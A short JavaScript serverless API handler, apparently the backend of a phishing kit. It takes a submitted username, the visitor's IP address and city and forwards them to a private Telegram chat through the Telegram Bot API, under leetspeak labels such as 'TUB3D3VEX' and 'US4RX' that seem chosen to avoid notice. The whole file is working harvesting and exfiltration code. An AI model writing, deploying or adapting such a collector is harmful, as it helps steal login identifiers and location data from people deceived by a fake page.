export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método no permitido' });
    }

    const { username, ip, city } = req.body;

    if (!username || !ip || !city) {
        return res.status(400).json({ error: 'Datos incompletos' });
    }

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    const message = `❤️TUB3D3VEX❤️\nUS4RX: ${username}\n\nIP: ${ip}\n${city}`;

    try {
        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
        });

        if (!response.ok) {
            throw new Error('Error al enviar el mensaje a Telegram');
        }

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Error interno del servidor' });
    }
}